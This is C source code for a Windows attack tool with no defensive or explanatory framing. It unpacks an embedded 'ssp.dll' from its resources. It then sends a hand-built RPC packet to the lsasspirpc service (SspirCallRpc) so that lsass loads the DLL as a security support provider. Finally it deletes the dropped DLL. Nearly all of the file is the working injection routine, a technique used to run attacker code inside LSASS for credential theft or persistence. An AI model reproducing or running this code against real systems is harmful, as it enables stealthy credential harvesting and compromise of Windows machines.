#define SECURITY_WIN32
#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <Windows.h>
#include <subauth.h>
#include <sspi.h>
#include <Dbghelp.h>
#include "sspi_h.h"
#include "resource.h"

#pragma comment(lib,"rpcrt4.lib")

typedef VOID(*Func)(VOID);

BOOL ReleaseLibrary(UINT uResourceId, LPCWSTR szResourceType, LPCWSTR szFileName)
{

	HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(uResourceId), szResourceType);
	if (hRsrc == NULL)
	{
		printf("Find Resource Error!");
		return FALSE;
	}

	DWORD dwSize = SizeofResource(NULL, hRsrc);
	if (dwSize <= 0)
	{
		printf("Get Resource Error!");
		return FALSE;
	}

	HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL)
	{
		printf("Load Resource Error!");
		return FALSE;
	}


	LPVOID lpRes = LockResource(hGlobal);
	if (lpRes == NULL)
	{
		printf("Lock Resource Error!");
		return FALSE;
	}
	HANDLE hFile = CreateFile(szFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == NULL)
	{
		printf("Create File Error!");
		return FALSE;
	}
	DWORD dwWriten = 0;
	BOOL bRes = WriteFile(hFile, lpRes, dwSize, &dwWriten, NULL);
	if (bRes == FALSE || dwWriten <= 0)
	{
		printf("Write To File Error!");
		return FALSE;
	}
	CloseHandle(hFile);
	CloseHandle(hGlobal);
	CloseHandle(hRsrc);
	return TRUE;
}


int main(int argc, char** argv) {
	RPC_STATUS status;
	UNICODE_STRING packageName;
	UWORD packetLen = 0;
	RPC_WSTR pszStringBinding = NULL;
	unsigned long ulCode;
	unsigned long long unk1;
	unsigned char rpcPacket[0x2000];
	long out1 = 0, out2 = 0;
	void* out3 = (void*)0;
	struct Struct_144_t out4;
	TCHAR dllPath[MAX_PATH];
	char dllPath2[MAX_PATH];
	
	// Get DLL Path
	GetModuleFileName(NULL, dllPath, MAX_PATH);
	wchar_t* mainfname = wcsrchr(dllPath, '\\');
	wcscpy((mainfname + 1), L"ssp.dll");
	wcstombs(dllPath2, dllPath, MAX_PATH);

	printf("\n[*] Get DLL PATH: %s\n", dllPath2);

	printf("[*] Release DLL...\n");

	// Release DLL
	BOOL bRes = ReleaseLibrary(IDR_SSP_DLL1, L"SSP_DLL", dllPath);
	if (bRes == FALSE)
	{
		printf("Release DLL Error!");
		return 0;
	}

	printf("[*] Release DLL success!\n");

	printf("[*] Building RPC packet\n");

	// Init RPC packet
	memset(&packageName, 0, sizeof(packageName));
	memset(rpcPacket, 0, sizeof(rpcPacket));

	// Build DLL to be loaded by lsass
	packageName.Length = strlen(dllPath2) * 2;
	packageName.MaximumLength = (strlen(dllPath2) * 2) + 2;
	mbstowcs((wchar_t*)(rpcPacket + 0xd8), dllPath2, (sizeof(rpcPacket) - 0xd8) / 2);
	packetLen = 0xd8 + packageName.MaximumLength;

	// Complete RPC packet fields
	*(unsigned long long*)rpcPacket = 0xc4; // ??
	*(unsigned short*)(rpcPacket + 2) = packetLen; // Length of packet
	*(unsigned long long*)((char*)rpcPacket + 8) = GetCurrentProcessId();  // Process ID
	*(unsigned long long*)((char*)rpcPacket + 16) = GetCurrentThreadId();  //Thread ID
	*(unsigned long long*)((char*)rpcPacket + 0x28) = 0x0b;  // RPC call ID
	*(void**)((char*)rpcPacket + 0xd0) = &unk1; // ??

	// Copy package name into RPC packet
	memcpy(rpcPacket + 0x40, &packageName, 8);
	*(unsigned long long*)((char*)rpcPacket + 0x48) = 0xd8;  // Offset to unicode ssp name

	// Create the RPC connection string
	status = RpcStringBindingCompose(NULL,
		(RPC_WSTR)L"ncalrpc",
		NULL,
		(RPC_WSTR)L"lsasspirpc",
		NULL,
		&pszStringBinding);
	if (status) {
		return 1;
	}

	// Create RPC handle
	printf("[*] Connecting to lsasspirpc RPC service\n");
	status = RpcBindingFromStringBinding(pszStringBinding, &default_IfHandle);
	if (status) {
		return 1;
	}

	memset(&out4, 0, sizeof(out4));

	RpcTryExcept
	{
		// Create our RPC context handle
		printf("[*] Sending SspirConnectRpc call\n");
		long ret = Proc0_SspirConnectRpc((unsigned char*)NULL, 2, &out1, &out2, &out3);

		// Make the "AddSecurityPackage" call directly via RPC
		printf("[*] Sending SspirCallRpc call\n");
		ret = Proc3_SspirCallRpc(out3, packetLen, rpcPacket, &out2, (unsigned char**)&out3, &out4);
	}
		RpcExcept(1)
	{
		ulCode = RpcExceptionCode();
		if (ulCode == 0x6c6) {
			printf("[*] Error code 0x6c6 returned, which is expected if DLL load returns FALSE\n");
		}
		else {
			printf("[!] Error code %x received\n", ulCode);
		}
	}
	RpcEndExcept
	
		if (remove(dllPath2) == 0)
		{
			printf("[*] Delete DLL success!\n");
		}
		else {
			printf("[*] Delete DLL failed!\n");
		}
	

		return 0;
}

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t len)
{
	return(malloc(len));
}

void __RPC_USER midl_user_free(void __RPC_FAR* ptr)
{
	free(ptr);
}